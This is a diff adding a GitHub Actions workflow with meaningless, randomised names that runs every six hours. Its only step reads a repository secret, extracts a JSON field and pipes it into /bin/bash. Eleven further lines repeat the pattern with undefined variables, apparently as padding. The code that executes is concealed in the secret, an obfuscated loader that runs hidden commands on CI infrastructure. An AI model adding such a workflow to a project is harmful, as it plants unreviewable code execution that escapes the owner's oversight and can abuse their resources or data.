@@ -1,0 +1,28 @@
+name: duqianchaoo
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '43 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: duqianchaoo
+        env:
+          gafe0278: ${{ secrets.gafe0278 }}
+        run: |
+          echo $gafe0278 | jq -r .tst7477 | /bin/bash
+          echo $kigf4 | jq -r .tosjw3643 | /bin/bash
+          echo $qb7901 | jq -r .lv035 | /bin/bash
+          echo $g611 | jq -r .bkj5160 | /bin/bash
+          echo $rh68 | jq -r .g93001 | /bin/bash
+          echo $p837 | jq -r .d48 | /bin/bash
+          echo $dt71 | jq -r .exr437 | /bin/bash
+          echo $lnu09003 | jq -r .udwa033 | /bin/bash
+          echo $z7481 | jq -r .k571 | /bin/bash
+          echo $j869 | jq -r .yjy57491 | /bin/bash
+          echo $famp26436 | jq -r .hevsx2989 | /bin/bash
+          echo $pc6667 | jq -r .v82 | /bin/bash
+
